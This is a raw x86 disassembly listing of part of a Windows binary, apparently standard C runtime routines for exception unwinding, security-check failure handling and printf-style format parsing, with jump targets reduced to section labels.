push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_4136a0
add esp 0xc
pop ebp
retn 0x4
sub_41379e
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_4137ce
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push edx
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_413800
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413820
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_40d56a
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_413865
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_413865
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_413820
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_413915
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_413934
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_41390c
push ebx
push ecx
mov ebx rw-data
jmp r-xdata
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_413915
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_413937
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x8 ] 0xffffffff
push edi
je r-xdata
push 0x50
lea eax [ ebp - 0x320 ]
push 0x0
push eax
call sub_411230
push 0x2cc
lea eax [ ebp - 0x2d0 ]
push 0x0
push eax
call sub_411230
lea eax [ ebp - 0x320 ]
add esp 0x18
mov [ ebp - 0x328 ] eax
lea eax [ ebp - 0x2d0 ]
mov [ ebp - 0x324 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
mov [ ebp - 0x218 ] eax
lea eax [ ebp + 0x4 ]
mov [ ebp - 0x20c ] eax
mov [ ebp - 0x2d0 ] 0x10001
mov eax [ eax - 0x4 ]
mov [ ebp - 0x21c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x320 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x31c ] eax
mov eax [ ebp + 0x4 ]
mov [ ebp - 0x314 ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov edi eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x328 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
call sub_40e288
pop ecx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop edi
call sub_40d56a
mov esp ebp
pop ebp
retn
test edi edi
jne r-xdata
cmp [ ebp + 0x8 ] 0xffffffff
je r-xdata
push [ ebp + 0x8 ]
call sub_40e288
pop ecx
sub_413a86
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
call sub_41ab17
test eax eax
je r-xdata
push [ ebp + 0x18 ]
mov esi [ rw-data ]
mov ecx esi
push [ ebp + 0x14 ]
xor esi [ rw-data ]
and ecx 0x1f
push [ ebp + 0x10 ]
ror esi cl
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
test esi esi
jne r-xdata
mov esi [ eax + 0x35c ]
test esi esi
je r-xdata
mov ecx esi
call [ r--data ]
call esi
mov ecx [ ebp - 0x4 ]
add esp 0x14
xor ecx ebp
pop esi
call sub_40d56a
mov esp ebp
pop ebp
retn
call sub_413b2e
int3
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
sub_413b11
mov edi edi
push esi
xor esi esi
push esi
push esi
push esi
push esi
push esi
call sub_413a86
add esp 0x14
push esi
push esi
push esi
push esi
push esi
call sub_413b2e
int3
sub_413b2e
push 0x17
call IsProcessorFeaturePresent
test eax eax
je r-xdata
push esi
push 0x1
mov esi 0xc0000417
push esi
push 0x2
call sub_413937
add esp 0xc
push esi
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
pop esi
retn
push 0x5
pop ecx
int 0x29
sub_413b77
mov edi edi
push ebp
mov ebp esp
sub esp 0x484
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x18 ] 0x0
mov eax [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0x14 ]
mov [ ebp - 0x460 ] eax
jne r-xdata
test ebx ebx
je r-xdata
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
or eax 0xffffffff
jmp r-xdata
push esi
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x484 ]
call sub_414048
mov ecx [ ebp + 0x8 ]
lea edi [ ebp - 0x470 ]
xor eax eax
xor edx edx
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov eax ecx
mov edi [ ebp - 0x460 ]
and eax 0x2
mov [ ebp - 0x474 ] eax
or eax edx
mov [ ebp - 0x470 ] edi
mov [ ebp - 0x46c ] ebx
mov [ ebp - 0x468 ] edx
jne r-xdata
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_40d56a
mov esp ebp
pop ebp
retn
mov [ ebp - 0x464 ] 0x1
mov [ ebp - 0x464 ] dl
test edi edi
jne r-xdata
lea ecx [ ebp - 0x41c ]
call sub_4140cb
cmp [ ebp - 0x478 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
xor ecx ecx
and eax 0x1
or eax ecx
je r-xdata
push [ ebp + 0x20 ]
lea eax [ ebp - 0x470 ]
mov [ ebp - 0x460 ] eax
lea eax [ ebp - 0x480 ]
push eax
push [ ebp + 0x18 ]
lea eax [ ebp - 0x460 ]
push [ ebp + 0xc ]
push ecx
push eax
lea ecx [ ebp - 0x45c ]
call sub_414013
lea ecx [ ebp - 0x45c ]
call sub_41424d
mov esi eax
test edi edi
je r-xdata
pop edi
mov eax esi
pop esi
mov ecx [ ebp - 0x484 ]
and [ ecx + 0x350 ] 0xfffffffd
mov eax [ ebp - 0x474 ]
or eax ecx
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x468 ]
cmp eax ebx
jne r-xdata
test esi esi
jne r-xdata
mov eax [ ebp - 0x468 ]
cmp eax ebx
jne r-xdata
or esi 0xffffffff
jmp r-xdata
test esi esi
jns r-xdata
mov [ edi + eax ] cl
test esi esi
js r-xdata
push 0xfffffffe
pop esi
mov eax [ ebp - 0x468 ]
cmp eax ebx
je r-xdata
mov [ edi ] cl
jmp r-xdata
cmp esi ebx
jbe r-xdata
mov [ edi + ebx - 0x1 ] cl
jmp r-xdata
jmp r-xdata
sub_413cf3
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0x10 ]
test esi esi
je r-xdata
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
or eax 0xffffffff
pop ebp
retn
call sub_41529e
mov [ eax ] 0x16
cmp [ ebp + 0x14 ] 0x0
jbe r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_413b77
add esp 0x1c
test eax eax
jns r-xdata
cmp eax 0xfffffffe
jne r-xdata
mov [ esi ] 0x0
pop esi
pop ebp
retn
call sub_41529e
mov [ eax ] 0x22
jmp r-xdata
call sub_413b01
or eax 0xffffffff
sub_413d83
mov edi edi
push ebp
mov ebp esp
push ecx
or eax 0xffffffff
xor edx edx
push esi
mov esi [ ebp + 0x8 ]
div esi
push edi
and eax 0xfffffffe
mov edi ecx
cmp eax 0x2
jae r-xdata
push ebx
xor ebx ebx
add esi esi
cmp [ edi + 0x404 ] ebx
jne r-xdata
call sub_41529e
mov [ eax ] 0xc
xor al al
jmp r-xdata
cmp esi [ edi + 0x400 ]
ja r-xdata
cmp esi 0x400
jbe r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call sub_419b3e
mov [ ebp - 0x4 ] eax
pop ecx
test eax eax
je r-xdata
mov al 0x1
jmp r-xdata
push eax
call sub_41a3a5
pop ecx
mov al bl
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ edi + 0x404 ]
call sub_4140e5
mov eax [ ebp - 0x4 ]
mov bl 0x1
mov [ edi + 0x400 ] esi
pop ebx
sub_413e09
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
dec eax
sub eax 0x1
je r-xdata
xor al al
pop ebp
retn
sub eax 0x1
je r-xdata
mov al 0x1
pop ebp
retn
sub eax 0x9
je r-xdata
cmp [ ebp + 0x14 ] 0xd
je r-xdata
mov al [ ebp + 0x10 ]
cmp al 0x63
je r-xdata
mov cl 0x1
cmp al 0x73
je r-xdata
xor cl cl
jmp r-xdata
xor eax eax
test cl cl
sete al
pop ebp
retn
sub_413e49
mov edi edi
push esi
mov esi ecx
push edi
mov edi [ esi + 0x404 ]
call sub_413d6b
test edi edi
jne r-xdata
add eax edi
add eax esi
jmp r-xdata
pop edi
pop esi
retn
sub_413e67
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
push edi
lea ecx [ esi + 0x40 ]
mov edi [ ecx + 0x404 ]
test edi edi
jne r-xdata
call sub_413d6b
mov ebx [ ebp + 0x8 ]
dec eax
add edi eax
mov [ esi + 0x34 ] edi
mov edi ecx
xor edx edx
mov eax ebx
div [ ebp + 0xc ]
dec ecx
add dl 0x30
mov [ esi + 0x28 ] ecx
mov ebx eax
cmp dl 0x39
jle r-xdata
test ebx ebx
je r-xdata
mov eax [ esi + 0x34 ]
mov [ eax ] dl
dec [ esi + 0x34 ]
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
sete al
dec al
and al 0xe0
add al 0x61
sub al 0x3a
add dl al
mov eax [ esi + 0x34 ]
sub edi eax
mov [ esi + 0x38 ] edi
inc eax
pop edi
mov [ esi + 0x34 ] eax
pop esi
pop ebx
pop ebp
retn 0xc
mov ecx [ esi + 0x28 ]
test ecx ecx
jg r-xdata
sub_413edc
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
push edi
lea ecx [ esi + 0x40 ]
mov edi [ ecx + 0x404 ]
test edi edi
jne r-xdata
call sub_413d6b
mov edx [ ebp + 0xc ]
dec eax
mov ebx [ ebp + 0x8 ]
add edi eax
mov [ esi + 0x34 ] edi
mov edi ecx
push 0x0
push [ ebp + 0x10 ]
lea eax [ ecx - 0x1 ]
push edx
push ebx
mov [ esi + 0x28 ] eax
call sub_4299f0
add cl 0x30
mov [ ebp - 0x4 ] ebx
mov ebx eax
cmp cl 0x39
jle r-xdata
mov eax ebx
or eax edx
je r-xdata
mov eax [ esi + 0x34 ]
mov [ eax ] cl
dec [ esi + 0x34 ]
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
sete al
dec al
and al 0xe0
add al 0x61
sub al 0x3a
add cl al
mov eax [ esi + 0x34 ]
sub edi eax
mov [ esi + 0x38 ] edi
inc eax
pop edi
mov [ esi + 0x34 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ esi + 0x28 ]
test ecx ecx
jg r-xdata
sub_413f64
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ ebp + 0x10 ] esi
jle r-xdata
pop esi
pop ebp
retn
push edi
mov edi [ ebp + 0x14 ]
pop edi
inc esi
cmp esi [ ebp + 0x10 ]
jl r-xdata
mov ecx [ ebp + 0x8 ]
push edi
push [ ebp + 0xc ]
call sub_414d7a
cmp [ edi ] 0xffffffff
je r-xdata
sub_413f90
mov edi edi
push ebp
mov ebp esp
push ecx
xor eax eax
mov [ ebp - 0x4 ] ecx
mov [ ecx ] eax
mov [ ecx + 0x4 ] eax
mov [ ecx + 0x8 ] eax
mov [ ecx + 0xc ] eax
mov [ ecx + 0x10 ] eax
mov [ ecx + 0x14 ] eax
mov [ ecx + 0x18 ] eax
mov [ ecx + 0x1c ] eax
mov [ ecx + 0x20 ] eax
mov [ ecx + 0x24 ] eax
mov [ ecx + 0x28 ] eax
mov [ ecx + 0x30 ] ax
mov [ ecx + 0x38 ] eax
mov [ ecx + 0x3c ] al
mov [ ecx + 0x440 ] eax
mov [ ecx + 0x444 ] eax
mov eax ecx
mov esp ebp
pop ebp
retn
sub_413fd7
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_413f90
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ esi + 0x448 ] eax
mov eax [ ebp + 0xc ]
mov [ esi ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0x4 ] eax
mov eax [ ebp + 0x18 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x14 ]
mov [ esi + 0x10 ] eax
mov eax [ ebp + 0x1c ]
mov [ esi + 0x14 ] eax
mov eax esi
pop esi
pop ebp
retn 0x18
sub_414013
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x1c ]
mov esi ecx
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_413fd7
and [ esi + 0x450 ] 0x0
call sub_41529e
mov [ esi + 0xc ] eax
mov eax esi
pop esi
pop ebp
retn 0x18
sub_414048
mov edi edi
push ebp
mov ebp esp
push edi
mov edi ecx
mov ecx [ ebp + 0x8 ]
mov [ edi + 0xc ] 0x0
test ecx ecx
je r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ ecx ]
mov [ edi + 0x4 ] eax
mov eax [ ecx + 0x4 ]
jmp r-xdata
push esi
call sub_41aa93
lea edx [ edi + 0x4 ]
mov [ edi ] eax
push edx
lea esi [ edi + 0x8 ]
mov ecx [ eax + 0x4c ]
mov [ edx ] ecx
mov ecx [ eax + 0x48 ]
push eax
mov [ esi ] ecx
call sub_41ae60
push esi
push [ edi ]
call sub_41ae8d
mov ecx [ edi ]
add esp 0x10
mov eax [ ecx + 0x350 ]
pop esi
test al 0x2
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x4 ] eax
mov eax [ rw-data ]
mov [ edi + 0x8 ] eax
jmp r-xdata
mov eax edi
pop edi
pop ebp
retn 0x4
or eax 0x2
mov [ ecx + 0x350 ] eax
mov [ edi + 0xc ] 0x1
sub_4140e5
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
push [ esi ]
call sub_41a3a5
mov edx [ ebp + 0x8 ]
and [ esi ] 0x0
pop ecx
mov eax [ edx ]
mov [ esi ] eax
mov eax esi
and [ edx ] 0x0
pop esi
pop ebp
retn 0x4
sub_414109
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
push ebx
mov eax [ eax ]
mov eax [ eax + 0x88 ]
mov eax [ eax ]
mov bl [ eax ]
jmp r-xdata
mov al [ ecx ]
test al al
jne r-xdata
cmp al bl
je r-xdata
mov al [ ecx ]
inc ecx
test al al
je r-xdata
inc ecx
pop ebx
pop ebp
retn
jmp r-xdata
mov al [ ecx ]
test al al
jne r-xdata
cmp al 0x65
je r-xdata
mov edx ecx
cmp al 0x45
je r-xdata
dec ecx
cmp [ ecx ] 0x30
je r-xdata
cmp [ ecx ] bl
jne r-xdata
inc ecx
mov al [ edx ]
inc ecx
inc edx
mov [ ecx ] al
test al al
jne r-xdata
dec ecx
sub_414160
mov edi edi
push ebp
mov ebp esp
mov cl [ ebp + 0x8 ]
lea eax [ ecx - 0x20 ]
cmp al 0x5a
ja r-xdata
xor eax eax
movsx eax cl
movzx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
imul ecx eax 0x9
mov eax [ ebp + 0xc ]
movzx eax [ ecx + eax + r--data ]
shr eax 0x4
pop ebp
retn 0x8
sub_414195
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
movsx eax [ esi ]
push eax
call sub_416f3a
cmp eax 0x65
jmp r-xdata
pop ecx
jne r-xdata
inc esi
movzx eax [ esi ]
push eax
call sub_419559
test eax eax
movsx eax [ esi ]
push eax
call sub_416f3a
pop ecx
cmp eax 0x78
jne r-xdata
mov eax [ ebp + 0xc ]
mov cl [ esi ]
mov eax [ eax ]
mov eax [ eax + 0x88 ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
inc esi
add esi 0x2
mov al [ esi ]
mov [ esi ] cl
mov cl al
mov al [ esi ]
inc esi
test al al
jne r-xdata
pop esi
pop ebp
retn
sub_4141f1
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
lea ecx [ ebp - 0x4 ]
push edi
push 0xa
push ecx
mov edi [ esi + 0xc ]
mov ebx [ edi ]
and [ edi ] 0x0
mov eax [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
dec eax
push eax
call sub_41abe2
mov ecx [ ebp + 0x8 ]
add esp 0xc
mov [ ecx ] eax
mov eax [ esi + 0xc ]
cmp [ eax ] 0x22
je r-xdata
xor al al
mov eax [ ebp - 0x4 ]
cmp eax [ esi + 0x10 ]
jb r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test ebx ebx
je r-xdata
mov [ esi + 0x10 ] eax
mov al 0x1
jmp r-xdata
mov [ edi ] ebx
cmp [ edi ] 0x0
jne r-xdata
sub_41424d
mov edi edi
push esi
mov esi ecx
lea ecx [ esi + 0x448 ]
call sub_41602a
test al al
jne r-xdata
push ebx
xor ebx ebx
cmp [ esi + 0x10 ] ebx
jne r-xdata
or eax 0xffffffff
pop esi
retn
inc [ esi + 0x450 ]
cmp [ esi + 0x450 ] 0x2
jne r-xdata
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
mov [ esi + 0x38 ] ebx
mov [ esi + 0x1c ] ebx
jmp r-xdata
mov eax [ esi + 0x18 ]
pop ebx
pop esi
retn
mov eax [ esi + 0x10 ]
mov al [ eax ]
mov [ esi + 0x31 ] al
test al al
jne r-xdata
inc [ esi + 0x10 ]
cmp [ esi + 0x18 ] ebx
jl r-xdata
inc [ esi + 0x10 ]
mov ecx esi
call sub_414d58
test al al
je r-xdata
push [ esi + 0x1c ]
movzx eax [ esi + 0x31 ]
mov ecx esi
push eax
call sub_414160
mov [ esi + 0x1c ] eax
cmp eax 0x8
je r-xdata
or eax 0xffffffff
jmp r-xdata
cmp eax 0x7
ja r-xdata
jmp [ eax * 4 + jump_table_414355 ]
mov ecx esi
call sub_4143b2
jmp r-xdata
or [ esi + 0x28 ] 0xffffffff
mov [ esi + 0x24 ] ebx
mov [ esi + 0x30 ] bl
mov [ esi + 0x20 ] ebx
mov [ esi + 0x2c ] ebx
mov [ esi + 0x3c ] bl
jmp r-xdata
mov ecx esi
call sub_414375
jmp r-xdata
mov ecx esi
call sub_41481c
jmp r-xdata
mov [ esi + 0x28 ] ebx
jmp r-xdata
mov ecx esi
call sub_41445c
jmp r-xdata
mov ecx esi
call sub_414484
jmp r-xdata
mov ecx esi
call sub_4145ed
test al al
je r-xdata
sub_414375
movsx eax [ ecx + 0x31 ]
sub eax 0x20
je r-xdata
or [ ecx + 0x20 ] 0x2
sub eax 0x3
je r-xdata
or [ ecx + 0x20 ] 0x20
jmp r-xdata
sub eax 0x8
je r-xdata
mov al 0x1
retn
or [ ecx + 0x20 ] 0x1
jmp r-xdata
dec eax
sub eax 0x1
je r-xdata
or [ ecx + 0x20 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
or [ ecx + 0x20 ] 0x8
jmp r-xdata
sub_4143d1
mov edi edi
push esi
push 0x0
mov esi ecx
call sub_4143fb
test al al
jne r-xdata
lea eax [ esi + 0x18 ]
push eax
movzx eax [ esi + 0x31 ]
lea ecx [ esi + 0x448 ]
push eax
call sub_414d7a
mov al 0x1
pop esi
retn
pop esi
retn
sub_4143fb
mov edi edi
push esi
mov esi ecx
push edi
mov edi 0x8000
mov eax [ esi + 0x8 ]
mov cl [ esi + 0x31 ]
mov [ esi + 0x3c ] 0x0
movzx edx cl
mov eax [ eax ]
mov eax [ eax ]
test [ eax + edx * 2 ] di
je r-xdata
mov al 0x1
lea eax [ esi + 0x18 ]
push eax
push ecx
lea ecx [ esi + 0x448 ]
call sub_414d7a
mov ecx [ esi + 0x10 ]
mov al [ ecx ]
mov [ esi + 0x31 ] al
lea eax [ ecx + 0x1 ]
cmp [ esi + 0x31 ] 0x0
mov [ esi + 0x10 ] eax
jne r-xdata
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
xor al al
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_41445c
cmp [ ecx + 0x31 ] 0x2a
je r-xdata
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
mov [ ecx + 0x28 ] eax
test eax eax
jns r-xdata
lea eax [ ecx + 0x28 ]
push eax
call sub_4141f1
retn
mov al 0x1
retn
or [ ecx + 0x28 ] 0xffffffff
sub_414484
mov al [ ecx + 0x31 ]
cmp al 0x46
jne r-xdata
cmp al 0x4e
jne r-xdata
mov eax [ ecx ]
and eax 0x8
or eax 0x0
jne r-xdata
cmp [ ecx + 0x2c ] 0x0
jne r-xdata
mov eax [ ecx ]
push 0x8
pop edx
and eax edx
or eax 0x0
jne r-xdata
mov al 0x1
retn
mov [ ecx + 0x1c ] 0x7
jmp sub_4145ed
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
xor al al
retn
movsx eax al
cmp eax 0x6a
jg r-xdata
mov [ ecx + 0x1c ] edx
cmp eax 0x6c
je r-xdata
je r-xdata
mov eax [ ecx + 0x10 ]
cmp [ eax ] 0x6c
jne r-xdata
cmp eax 0x74
je r-xdata
mov [ ecx + 0x2c ] 0x5
jmp r-xdata
cmp eax 0x49
je r-xdata
mov [ ecx + 0x2c ] 0x3
inc eax
mov [ ecx + 0x2c ] 0x4
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov [ ecx + 0x2c ] 0x7
jmp r-xdata
cmp eax 0x77
je r-xdata
mov edx [ ecx + 0x10 ]
mov al [ edx ]
cmp al 0x33
jne r-xdata
cmp eax 0x4c
je r-xdata
mov [ ecx + 0x2c ] 0xc
jmp r-xdata
cmp eax 0x7a
jne r-xdata
cmp al 0x36
jne r-xdata
cmp [ edx + 0x1 ] 0x32
jne r-xdata
mov [ ecx + 0x2c ] 0x8
jmp r-xdata
cmp eax 0x54
je r-xdata
mov [ ecx + 0x2c ] 0x6
jmp r-xdata
cmp al 0x64
je r-xdata
cmp [ edx + 0x1 ] 0x34
jne r-xdata
lea eax [ edx + 0x2 ]
mov [ ecx + 0x2c ] 0xa
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov [ ecx + 0x2c ] 0xd
jmp r-xdata
cmp eax 0x68
jne r-xdata
mov [ ecx + 0x2c ] 0x9
jmp r-xdata
cmp al 0x69
je r-xdata
lea eax [ edx + 0x2 ]
mov [ ecx + 0x2c ] 0xb
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov eax [ ecx + 0x10 ]
cmp [ eax ] 0x68
jne r-xdata
cmp al 0x6f
je r-xdata
mov [ ecx + 0x2c ] 0x2
jmp r-xdata
inc eax
mov [ ecx + 0x2c ] 0x1
mov [ ecx + 0x10 ] eax
jmp r-xdata
cmp al 0x75
je r-xdata
cmp al 0x78
je r-xdata
cmp al 0x58
jne r-xdata
sub_4145ed
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
xor ebx ebx
inc ebx
xor ecx ecx
movsx eax [ esi + 0x31 ]
cmp eax 0x64
jg r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ esi + 0x20 ] 0x10
cmp eax 0x58
jg r-xdata
mov ecx esi
call sub_414ce5
dec eax
sub eax 0x1
je r-xdata
mov ecx esi
call sub_414ccd
jmp r-xdata
cmp eax 0x67
jle r-xdata
test al al
jne r-xdata
sub eax 0x5a
je r-xdata
je r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
xor al al
jmp r-xdata
push ecx
push 0xa
sub eax 0x3
jne r-xdata
mov ecx esi
call sub_414906
jmp r-xdata
cmp eax 0x69
je r-xdata
mov ecx esi
call sub_4148a3
jmp r-xdata
sub eax 0x7
je r-xdata
push ebx
cmp eax 0x41
je r-xdata
mov edx [ esi + 0x20 ]
xor eax eax
push edi
mov [ ebp - 0x4 ] ax
mov edi eax
mov [ ebp - 0x2 ] al
mov eax edx
shr eax 0x4
test bl al
je r-xdata
mov al bl
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ecx
jmp r-xdata
cmp eax 0x6e
je r-xdata
dec eax
sub eax 0x1
jne r-xdata
mov ecx esi
call sub_414af0
jmp r-xdata
cmp eax 0x43
je r-xdata
mov cl [ esi + 0x31 ]
cmp cl 0x78
je r-xdata
mov eax edx
shr eax 0x6
test bl al
je r-xdata
push 0x10
jmp r-xdata
mov ecx esi
call sub_414c3a
jmp r-xdata
cmp eax 0x6f
jne r-xdata
push ecx
mov ecx esi
call sub_414a60
jmp r-xdata
cmp eax 0x44
jle r-xdata
mov eax edx
shr eax 0x5
test bl al
jne r-xdata
cmp cl 0x58
jne r-xdata
test bl dl
je r-xdata
mov [ ebp - 0x4 ] 0x2d
jmp r-xdata
mov ecx esi
call sub_414cae
jmp r-xdata
cmp eax 0x47
jle r-xdata
cmp cl 0x61
je r-xdata
xor bl bl
mov eax edx
shr eax 0x1
test bl al
je r-xdata
mov [ ebp - 0x4 ] 0x2b
jmp r-xdata
mov edi ebx
cmp eax 0x53
jne r-xdata
mov al 0x1
cmp cl 0x41
je r-xdata
mov [ ebp - 0x4 ] 0x20
mov [ ebp + edi - 0x4 ] 0x30
cmp cl 0x58
je r-xdata
test al al
je r-xdata
xor al al
jmp r-xdata
mov al 0x1
cmp cl 0x41
je r-xdata
mov ebx [ esi + 0x24 ]
sub ebx [ esi + 0x38 ]
sub ebx edi
test dl 0xc
jne r-xdata
test bl bl
jne r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push edi
lea eax [ ebp - 0x4 ]
lea ecx [ esi + 0x448 ]
push eax
call sub_414e63
mov ecx [ esi + 0x20 ]
lea edi [ esi + 0x18 ]
mov eax ecx
shr eax 0x3
test al 0x1
je r-xdata
lea eax [ esi + 0x18 ]
push eax
push ebx
lea eax [ esi + 0x448 ]
push 0x20
push eax
call sub_413f64
add esp 0x10
xor al al
jmp r-xdata
push 0x0
mov ecx esi
call sub_414dbc
cmp [ edi ] 0x0
jl r-xdata
shr ecx 0x2
test cl 0x1
jne r-xdata
test al al
sete al
dec al
and al 0xe0
add al 0x78
mov [ ebp + edi - 0x3 ] al
add edi 0x2
mov al 0x1
pop edi
mov eax [ esi + 0x20 ]
shr eax 0x2
test al 0x1
je r-xdata
push edi
push ebx
lea eax [ esi + 0x448 ]
push 0x30
push eax
call sub_413f64
add esp 0x10
push edi
push ebx
lea eax [ esi + 0x448 ]
push 0x20
push eax
call sub_413f64
add esp 0x10
sub_41481c
cmp [ ecx + 0x31 ] 0x2a
je r-xdata
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
mov [ ecx + 0x24 ] eax
test eax eax
jns r-xdata
lea eax [ ecx + 0x24 ]
push eax
call sub_4141f1
retn
mov al 0x1
retn
or [ ecx + 0x20 ] 0x4
